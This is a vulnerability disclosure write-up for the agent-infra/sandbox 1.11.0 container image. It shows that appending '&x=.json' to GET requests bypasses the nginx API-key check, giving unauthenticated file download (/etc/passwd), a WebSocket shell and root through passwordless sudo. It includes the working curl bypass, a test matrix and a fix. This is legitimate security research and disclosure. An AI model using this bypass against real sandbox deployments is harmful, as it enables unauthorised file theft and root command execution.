# agent-infra/sandbox — nginx auth bypass → unauthenticated file download → root RCE

The sandbox gateway decides whether to require an API key by matching the **full request URI,
including the query string**. Appending `?x=.json` to a protected GET endpoint triggers the
unauthenticated routing path; the impact depends on the underlying endpoint. `aiod` does not
re-check the key. The result is unauthenticated file download via `/v1/file/download` and an
unauthenticated WebSocket shell that runs as `gem` with passwordless `sudo` to root (full
container filesystem access as root).

| | |
|---|---|
| Image | `ghcr.io/agent-infra/sandbox:1.11.0` (tag digest `sha256:6328d7fd…`, identical to `latest` at test time) |
| Source | `github.com/agent-infra/sandbox` |
| Audited | `1.11.0`, image digest `sha256:6328d7fd2f0ff0b4c147c3d05b3df1ce331f4a482eb6e550ecd64ed1fcf906e7`, image ID `sha256:c8c90673082b6d4bf6517bda004cbf8b6059fd17a0866d1971e17cce3da18ee9` |
| Affected | `1.11.0` verified live; other tags not tested |
| Severity | Critical — CVSS 3.1 **9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-288 (Authentication Bypass Using an Alternate Path), CWE-306 (Missing Authentication) |
| CVE | none assigned |
| Reported by | Teycir ([github.com/Teycir](https://github.com/Teycir)) |
| Status | Unfixed in `1.11.0`; not yet reported to vendor or a CNA |

CVSS 9.8 is assessed against the sandbox security boundary: container-root execution permits
unrestricted access to resources available within the container. Host-level compromise is not
claimed.

## Issue

`/opt/gem/nginx-server-active.conf` (sha256 `767145b6d19d4ce847400ac6ca4b6d9c7a5c8b3043133d1c1e4705600acaaf68`):

```nginx
11:map "$request_method:$request_uri" $target_workflow {
16:    "GET:/v1/ping" @proxy_without_auth;
19:    "~*^GET:.+\.(js|css|svg|woff|json|ico|png|jpg|jpeg|gif|webp|wasm|ttf|woff2)$" @proxy_without_auth;
42:        auth_request /_auth_handler;
57:    location @proxy_without_auth {
86:        proxy_set_header X-Original-URI $request_uri;
```

`$request_uri` is the raw URI **with arguments**. A request to
`/v1/file/download?path=/etc/passwd&x=.json` therefore matches line 19, is proxied by
`@proxy_without_auth`, and never reaches line 42. `aiod` trusts the gateway and does not
validate the key itself. The same bypass reaches `/v1/shell/terminal-url` and the
`/v1/shell/ws` upgrade; the shell user `gem` has passwordless `sudo`.

The bypass is **GET-only**: `POST /v1/shell/exec` without a key still returns `401`.

## Reproduce

```bash
docker run -d --name aio-test -e SANDBOX_API_KEY=testkey123 \
  -p 127.0.0.1:18080:8080 ghcr.io/agent-infra/sandbox:1.11.0

# control: 401
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd'

# bypass: 200 + file
curl -sS 'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd&x=.json'

# full chain
./pocs/poc.sh
python3 pocs/rce_ws.py
```

Expected: `/etc/passwd` without auth; then `uid=1000(gem)`, hostname, and
`uid=0(root)` from `sudo -n id`.

Controls (all live, `evidence/triage/00_matrix.txt`; pinned-tag re-run in
`evidence/pinned-1.11.0/`):

| Request | Auth | Status |
|---|---|---|
| `GET /v1/file/download?path=/tmp/nonce` | none | 401 |
| same + wrong `X-AIO-API-Key` | wrong | 401 |
| same + correct key | correct | 200 |
| same + `&x=.json` | none | **200** |
| same + `&x=.txt` | none | 401 |
| `GET /v1/sandbox` | none | 401 |
| `GET /v1/sandbox?x=.json` | none | **200** |
| `POST /v1/shell/exec` | none | 401 |

## Scope

- **Affected:** `1.11.0`, live container, default configuration with `SANDBOX_API_KEY` set.
- **Not verified:** other releases. The vulnerable map is present in the shipped config; no
  per-version range is claimed (`cve-submission/range-verification.txt`).
- **Not affected:** non-GET methods on the same paths (still `401`).
- **Precondition:** network reachability to the gateway. The key is not required.

## Demonstrated vs deployment-dependent

| Claim | Status |
|---|---|
| GET auth bypass | **Demonstrated** (matrix t01–t08) |
| Unauthenticated file download | **Demonstrated** (`/etc/passwd` byte-for-byte via `/v1/file/download`) |
| Unauthenticated shell, container root | **Demonstrated** (WS 101; `sudo -n id` → 0) |
| Jupyter / code-server without credentials | **Demonstrated** (200 / 302) |
| Host mounts, cloud metadata, lateral movement | **Deployment-dependent, not verified** |

The root shown is inside the sandbox container, not the Docker host.

## Fix

Primary: match on `$uri` (no arguments) instead of `$request_uri`, or strip the query string
before the map, and never treat a request with a query as a static asset:

```nginx
map "$request_method:$uri" $target_workflow { ... }
```

Defense in depth: re-validate the API key in `aiod`; require auth for `/v1/shell/*` even on
internal routes; remove passwordless `sudo` from `gem`; bind management ports to loopback only.

## Evidence

| Path | Contents |
|---|---|
| `report_20261121_201810.md` | Full assessment report (PTES/OWASP, CVSS, hashes; sha256 `7d8aaeee…`) |
| `cve-submission/advisory.md` | Advisory draft: metadata, root cause, PoC, impact, fix |
| `cve-submission/root-cause/` | Complete `nginx-server-with-auth.conf`, active config, `gem.sh` + auth-selection excerpt |
| `cve-submission/attack-path-simple.md` | Five-step chain |
| `cve-submission/attacker-cost.md` | Effort and prerequisites |
| `cve-submission/range-verification.txt` | What was and was not verified, incl. pinned tag |
| `evidence/triage/00_matrix.txt` | Eight-case auth matrix with statuses |
| `evidence/triage/t04_bypass_json.headers` | 200 response headers for the bypass |
| `evidence/triage/t12_ws_trace.txt` | Raw `101 Switching Protocols`, no auth header, shell frames |
| `evidence/triage/t09_container_hashes.txt` | Container-side hashes for the nonce and `/etc/passwd` |
| `evidence/triage/t10_nginx_config.txt` | Active config hash and vulnerable lines |
| `evidence/11_postexploit.txt` | `sudo -n id` → `uid=0(root)` |
| `evidence/pinned-1.11.0/` | Re-run against the explicit `1.11.0` tag; matrix, WS, hashes |
| `pocs/received/exfil_20261121_202320_479200.bin` | Exfiltrated WS trace (sha256 in report) |
| `cve-submission/MANIFEST.txt` | sha256 of the submission pack |

## Disclosure

No CVE assigned. Not yet sent to the vendor or a CNA. The repository is a local disclosure
pack; publish only after vendor notification and the agreed embargo.
